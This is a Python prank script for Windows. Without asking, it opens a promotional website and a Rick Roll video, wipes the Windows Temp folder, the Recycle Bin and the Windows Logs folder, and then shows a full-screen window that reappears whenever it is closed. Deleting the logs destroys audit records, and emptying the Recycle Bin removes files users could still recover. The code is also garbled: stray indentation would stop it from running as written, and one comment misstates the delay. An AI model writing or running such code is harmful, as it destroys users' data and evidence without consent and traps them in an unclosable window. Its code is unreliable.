import shutil, os, webbrowser, subprocess, winreg, tkinter as tk, time


###################################################################################
def Codescribe():
    webbrowser.open("http://codescribe.tilda.ws")

def Rick():
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

Codescribe()

time.sleep(1)

Rick()

###################################################################################

DelTemp = 'c:\windows\Temp'
for filename in os.listdir(DelTemp):
    file_path = os.path.join(DelTemp, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (file_path, e))

###################################################################################

        DelBin = 'C:\$Recycle.Bin'
for filename in os.listdir(DelBin):
    file_path = os.path.join(DelBin, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (file_path, e))

###################################################################################

        DelLogs = 'C:\\Windows\\Logs\\'
for filename in os.listdir(DelLogs):
    file_path = os.path.join(DelLogs, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
    except Exception as e:
        print('Failed to delete %s. Reason: %s' % (file_path, e))

###################################################################################

    import tkinter as tk
import time

# Function that runs when the user tries to close the window
def on_closing():
    print("You're trying to close the window, but it's locked!")
    lock_window()

# Function to lock the window by hiding it for 2 seconds
def lock_window():
    # Hide the window
    root.withdraw()
    # Wait for 2 seconds
    time.sleep(1)
    # Show the window again
    root.deiconify()

# Create the root window
root = tk.Tk()

# Set the title
root.title("Close_me")

# Set the window size
root.geometry("1920x1080")

# Bind the closing event to a custom function
root.protocol("WM_DELETE_WINDOW", on_closing)

# Main loop to keep the window open
root.mainloop()
